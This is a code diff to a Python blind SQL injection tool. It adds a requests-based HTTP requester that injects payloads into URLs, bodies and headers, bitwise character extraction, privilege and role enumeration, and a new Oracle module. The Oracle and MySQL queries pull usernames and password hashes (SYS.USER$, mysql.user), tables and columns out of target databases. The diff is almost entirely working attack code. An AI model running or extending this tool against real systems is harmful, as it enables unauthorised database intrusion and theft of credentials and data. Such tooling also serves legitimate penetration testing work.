@@ -39,18 +39,25 @@ logger.setLevel(logging.DEBUG)
 logger.addHandler(sh)
 logger.addHandler(fh)
 
-from Queue import Queue
+from Queue import Queue, Empty
 from time import sleep, time
 from threading import Thread, active_count, current_thread
 from urlparse import urlparse, urlunparse
 from string import Template
 import sys
-import pycurl
 from collections import OrderedDict
 try:
-  from cStringIO import StringIO
+  import requests
+  from requests.auth import HTTPBasicAuth
 except ImportError:
-  from StringIO import StringIO
+  try:
+    import pycurl
+  except ImportError:
+    logger.error('python-requests or pycurl required')
+  try:
+    from cStringIO import StringIO
+  except ImportError:
+    from StringIO import StringIO
 
 def T(s, **kwargs):
   return Template(s).safe_substitute(**kwargs)
@@ -62,46 +69,85 @@ class Timing:
 
   def __exit__(self, exc_type, exc_value, traceback):
     self.time = time() - self.t1
+
+def substitute_payload(payload, *args):
+    new = []
+    for arg in args:
+      new.append(arg.replace('${injection}', payload))
+    return new
 # }}}
 
 # Requester {{{
-class Requester_HTTP:
+class Requester_HTTP_Base(object):
 
   def __init__(self, state_tester, url, method='GET', body='', headers=[],
-    auth_type='basic', auth_creds='', proxy='', ssl_cert='', encode_payload=lambda x: x):
+    auth_type='basic', auth_creds='', proxies={}, ssl_cert='', encode_payload=lambda x: x):
 
     self.state_tester = state_tester
-    self.http_opts = url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert
+    self.http_opts = url, method, body, headers, auth_type, auth_creds, proxies, ssl_cert
     self.encode_payload = encode_payload
 
-    self.fp = pycurl.Curl()
-    self.fp.setopt(pycurl.SSL_VERIFYPEER, 0)
-    self.fp.setopt(pycurl.SSL_VERIFYHOST, 0)
-    self.fp.setopt(pycurl.HEADER, 1)
-    self.fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
-    self.fp.setopt(pycurl.NOSIGNAL, 1)
+  def check_state(self, payload, status_code, header_data, response_data, response_time, content_length):
+
+    stats = '%s %d:%d %.3f' % (status_code, len(header_data+response_data), int(content_length), response_time)
+    logger.debug('%s %s' % (stats, payload))
+
+    return self.state_tester(header_data, response_data, response_time)
+
+class Requester_HTTP_requests(Requester_HTTP_Base):
+
+  def __init__(self, *args, **kwargs):
+    super(Requester_HTTP_requests, self).__init__(*args, **kwargs)
+
+    _, _, _, _, auth_type, auth_creds, proxies, ssl_cert = self.http_opts
+
+    auth = None
+    if auth_creds:
+      if auth_type == 'basic':
+        u, p = auth_creds.split(':', 1)
+        auth = requests.auth.HTTPBasicAuth(u, p)
+
+    self.session = requests.Session()
+    self.proxies = proxies
+    self.auth = auth
+    self.cert = ssl_cert
 
   def test(self, payload):
 
-    url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert = self.http_opts
+    url, method, body, headers, _, _, _, _ = self.http_opts
 
-    fp = self.fp
-    fp.setopt(pycurl.PROXY, proxy)
+    url, body, headers = substitute_payload(self.encode_payload(payload), url, body, '\r\n'.join(headers))
 
-    def noop(buf): pass
-    fp.setopt(pycurl.WRITEFUNCTION, noop)
+    headers = dict(h.split(': ', 1) for h in headers.split('\r\n') if h)
 
-    def debug_func(t, s):
-      if t == pycurl.INFOTYPE_HEADER_IN:
-        header_buffer.write(s)
+    response = self.session.send(
+      self.session.prepare_request(
+        requests.Request(url=url, method=method, headers=headers, data=body)))
 
-      elif t == pycurl.INFOTYPE_DATA_IN:
-        response_buffer.write(s)
+    header_data = '\r\n'.join('%s: %s' % (k, v) for k, v in response.headers.iteritems())
 
-    header_buffer, response_buffer = StringIO(), StringIO()
+    if 'content-length' in response.headers:
+      content_length = response.headers['content-length']
+    else:
+      content_length = -1
 
-    fp.setopt(pycurl.DEBUGFUNCTION, debug_func)
-    fp.setopt(pycurl.VERBOSE, 1)
+    return self.check_state(payload, response.status_code, header_data, response.text, response.elapsed.total_seconds(), content_length)
+
+class Requester_HTTP_pycurl(Requester_HTTP_Base):
+
+  def __init__(self, *args, **kwargs):
+    super(Requester_HTTP_pycurl, self).__init__(*args, **kwargs)
+
+    fp = pycurl.Curl()
+    fp.setopt(pycurl.SSL_VERIFYPEER, 0)
+    fp.setopt(pycurl.SSL_VERIFYHOST, 0)
+    fp.setopt(pycurl.HEADER, 1)
+    fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
+    fp.setopt(pycurl.NOSIGNAL, 1)
+
+    _, _, _, _, auth_type, auth_creds, proxies, ssl_cert = self.http_opts
+
+    fp.setopt(pycurl.PROXY, proxies['http'] or proxies['https'])
 
     if auth_creds:
       fp.setopt(pycurl.USERPWD, auth_creds)
@@ -117,15 +163,29 @@ class Requester_HTTP:
     if ssl_cert:
       fp.setopt(pycurl.SSLCERT, ssl_cert)
 
+    def noop(buf): pass
+    fp.setopt(pycurl.WRITEFUNCTION, noop)
+    fp.setopt(pycurl.VERBOSE, 1)
+
+    self.fp = fp
+
+  def test(self, payload):
+
+    url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert = self.http_opts
+
+    def debug_func(t, s):
+      if t == pycurl.INFOTYPE_HEADER_IN:
+        header_buffer.write(s)
+
+      elif t == pycurl.INFOTYPE_DATA_IN:
+        response_buffer.write(s)
+    header_buffer, response_buffer = StringIO(), StringIO()
+
+    fp = self.fp
+    fp.setopt(pycurl.DEBUGFUNCTION, debug_func)
+
     scheme, host, path, params, query, fragment = urlparse(url)
-
-    def sub(payload, *args):
-      new = []
-      for arg in args:
-        new.append(arg.replace('${injection}', self.encode_payload(payload)))
-      return new 
-
-    query, body = sub(payload, query, body)
+    query, body, headers = substitute_payload(self.encode_payload(payload), query, body, '\r\n'.join(headers))
 
     method = method.upper()
     if method == 'GET':
@@ -134,9 +194,6 @@ class Requester_HTTP:
     elif method == 'POST':
       fp.setopt(pycurl.POST, 1)
       fp.setopt(pycurl.POSTFIELDS, body)
-
-      if 'Content-Type: ' not in '\n'.join(headers):
-        headers.append('Content-Type: application/x-www-form-urlencoded')
 
     elif method == 'HEAD':
       fp.setopt(pycurl.NOBODY, 1)
@@ -147,21 +204,21 @@ class Requester_HTTP:
     url = urlunparse((scheme, host, path, params, query, fragment))
     
     fp.setopt(pycurl.URL, url)
-    fp.setopt(pycurl.HTTPHEADER, headers)
+    fp.setopt(pycurl.HTTPHEADER, headers.split('\r\n'))
     fp.perform()
 
-    http_code = fp.getinfo(pycurl.HTTP_CODE)
-    content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
+    status_code = fp.getinfo(pycurl.HTTP_CODE)
     response_time = fp.getinfo(pycurl.TOTAL_TIME) - fp.getinfo(pycurl.PRETRANSFER_TIME)
+    content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
     header_data, response_data = header_buffer.getvalue(), response_buffer.getvalue()
 
-    stats = '%d %d:%d %.3f' % (http_code, len(header_data+response_data), content_length, response_time)
-    logger.debug('%s //%s' % (stats, payload))
+    return self.check_state(payload, status_code, header_data, response_data, response_time, content_length)
 
-    return self.state_tester(header_data, response_data, response_time)
+Requester_HTTP = Requester_HTTP_requests
+#Requester_HTTP = Requester_HTTP_pycurl
 # }}}
 
-# Methods {{{
+# Method {{{
 class Method_Base:
 
   def __init__(self, make_requester, template, num_threads=7):
@@ -228,7 +285,13 @@ class Method_bitwise(Method_Base):
 
       char = 0
       for _ in range(7):
-        bit_pos, state = self.resultq.get()
+        while True:
+          try:
+            bit_pos, state = self.resultq.get(False, 1)
+            break
+          except Empty:
+            pass
+
         char |= state << bit_pos
 
       logger.debug('char: %d (%s)' % (char, repr(chr(char))))
@@ -270,6 +333,7 @@ class Method_bitwise(Method_Base):
         except:
           mesg = '%s %s' % sys.exc_info()[:2]
           logger.warn('try %d, caught: %s' % (try_count, mesg))
+          logger.exception(sys.exc_info()[1])
 
           sleep(try_count * 2)
 
@@ -302,10 +366,11 @@ class SQLi_Base:
     enumeration.add_option('--current-db', dest='current_db', action='store_true', help='')
     enumeration.add_option('--hostname', dest='hostname', action='store_true', help='')
 
+    enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
+    enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')
+
     enumeration.add_option('--users', dest='enum_users', action='store_true', help='')
     enumeration.add_option('--passwords', dest='enum_passwords', action='store_true', help='')
-    #enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
-    #enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')
 
     enumeration.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
     enumeration.add_option('--tables', dest='enum_tables', action='store_true')
@@ -337,6 +402,14 @@ class SQLi_Base:
     if opts.hostname:
       queries.append(self.hostname())
 
+    if opts.enum_privileges:
+      for user in opts.user.split(','):
+        queries.append(self.enum_privileges(user))
+
+    if opts.enum_roles:
+      for user in opts.user.split(','):
+        queries.append(self.enum_roles(user))
+
     if opts.enum_users:
       queries.append(self.enum_users())
 
@@ -362,9 +435,12 @@ class SQLi_Base:
       queries.append(opts.query)
 
     with Timing() as timing:
-      for query in queries:
-        for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
-          yield result
+      try:
+        for query in queries:
+          for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
+            yield result
+      except KeyboardInterrupt:
+        print
 
     logger.info("Time: %.2f seconds" % (timing.time))
 
@@ -385,17 +461,22 @@ class MySQL_Blind(SQLi_Base):
   def hostname(self):
     return 'SELECT @@HOSTNAME'
 
+  def enum_privileges(self, user):
+    c = 'SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="%s"' % user
+    q = 'SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="%s" LIMIT ${row_pos},1' % user
+    return c, q
+
   def enum_users(self):
-    c = 'SELECT COUNT(DISTINCT(user)) FROM mysql.user'
-    q = 'SELECT DISTINCT(user) FROM mysql.user LIMIT ${row_pos},1'
+    c = 'SELECT COUNT(DISTINCT(grantee)) FROM information_schema.user_privileges'
+    q = 'SELECT DISTINCT(grantee) FROM information_schema.user_privileges LIMIT ${row_pos},1'
     return c, q
 
   def enum_passwords(self, user):
     if not user:
       raise NotImplementedError('-U required')
 
-    c = "SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user='%s'" % user
-    q = "SELECT DISTINCT(password) FROM mysql.user WHERE user='%s' LIMIT ${row_pos},1" % user
+    c = 'SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user="%s"' % user
+    q = 'SELECT DISTINCT(password) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
     return c, q
 
   def enum_dbs(self):
@@ -408,8 +489,10 @@ class MySQL_Blind(SQLi_Base):
       c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema="%s"' % db
       q = 'SELECT table_name FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},1' % db
     else:
-      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")'
-      q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name) FROM information_schema.tables WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
+      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema' \
+          ' NOT IN ("information_schema","mysql","performance_schema")'
+      q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name) FROM information_schema.tables WHERE table_schema' \
+          ' NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
     return c, q
 
   def enum_columns(self, db, table):
@@ -429,6 +512,89 @@ class MySQL_Blind(SQLi_Base):
     c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
     q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols), db, table)
     return c, q
+# }}}
+
+# Oracle {{{
+class Oracle_Blind(SQLi_Base):
+
+  def banner(self):
+    return 'SELECT banner FROM v$version WHERE ROWNUM=1'
+
+  def current_user(self):
+    return 'SELECT user FROM dual'
+
+  def hostname(self):
+    return 'SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL'
+
+  def enum_privileges(self, user):
+    if user:
+      c = "SELECT COUNT(PRIVILEGE) FROM DBA_SYS_PRIVS WHERE USERNAME='%s'" % user.upper()
+      q = "SELECT PRIVILEGE FROM (SELECT PRIVILEGE,ROWNUM-1 AS LIMIT FROM DBA_SYS_PRIVS WHERE USERNAME='%s') WHERE LIMIT=${row_pos}" % user.upper()
+    else:
+      c = "SELECT COUNT(PRIVILEGE) FROM USER_SYS_PRIVS"
+      q = "SELECT PRIVILEGE FROM (SELECT PRIVILEGE,ROWNUM-1 AS LIMIT FROM USER_SYS_PRIVS) WHERE LIMIT=${row_pos}"
+    return c, q
+
+  def enum_roles(self, user):
+    if user:
+      c = "SELECT COUNT(GRANTED_ROLE) FROM DBA_ROLE_PRIVS WHERE USERNAME='%s'" % user.upper()
+      q = "SELECT GRANTED_ROLE FROM (SELECT GRANTED_ROLE,ROWNUM-1 AS LIMIT FROM DBA_ROLE_PRIVS WHERE USERNAME='%s') WHERE LIMIT=${row_pos}"  % user.upper()
+
+    else:
+      c = "SELECT COUNT(GRANTED_ROLE) FROM USER_ROLE_PRIVS"
+      q = "SELECT GRANTED_ROLE FROM (SELECT GRANTED_ROLE,ROWNUM-1 AS LIMIT FROM USER_ROLE_PRIVS) WHERE LIMIT=${row_pos}"
+    return c, q
+
+  def enum_users(self):
+    c = 'SELECT COUNT(USERNAME) FROM SYS.ALL_USERS'
+    q = 'SELECT USERNAME FROM (SELECT USERNAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=${row_pos}'
+    return c, q
+
+  def enum_passwords(self, user):
+    if user:
+      c = "SELECT COUNT(PASSWORD) FROM SYS.USER$ WHERE NAME='%s'" % user.upper()
+      q = "SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM-1 AS LIMIT FROM SYS.USER$ WHERE NAME='%s') WHERE LIMIT=${row_pos}" % user.upper()
+    else:
+      c = "SELECT COUNT(PASSWORD) FROM SYS.USER$"
+      q = "SELECT NAME||':'||PASSWORD FROM (SELECT PASSWORD,ROWNUM-1 AS LIMIT FROM SYS.USER$) WHERE LIMIT=${row_pos}"
+    return c, q
+
+  def enum_dbs(self):
+    c = 'SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES'
+    q = 'SELECT OWNER FROM (SELECT OWNER,ROWNUM-1 AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT=${row_pos}'
+    return c, q
+
+  def enum_tables(self, db):
+    if not db:
+      raise NotImplementedError('-D required')
+
+    c = "SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER='%s'" % db
+    q = "SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE LIMIT=${row_pos}" % db
+    return c, q
+
+  # bugfix for sqlmap
+  def enum_columns(self, db, table):
+    if not db:
+      raise NotImplementedError('-D required')
+    if not table:
+      raise NotImplementedError('-T required')
+
+    c = "SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s'" % (table, db)
+    q = "SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE LIMIT=${row_pos}" % (table, db)
+    return c, q
+
+  def dump_table(self, db, table, cols):
+    if not db:
+      raise NotImplementedError('-D required')
+    if not table:
+      raise NotImplementedError('-T required')
+    if not cols:
+      raise NotImplementedError('-C required')
+
+    c = "SELECT COUNT(*) FROM %s" % table
+    q = "SELECT ENTRY_VALUE FROM (SELECT %s AS ENTRY_VALUE,ROWNUM-1 AS LIMIT FROM %s) WHERE LIMIT=${row_pos}" % ('||chr(58)||'.join(cols), table)
+    return c, q
+
 # }}}
 
 # MSSQL {{{
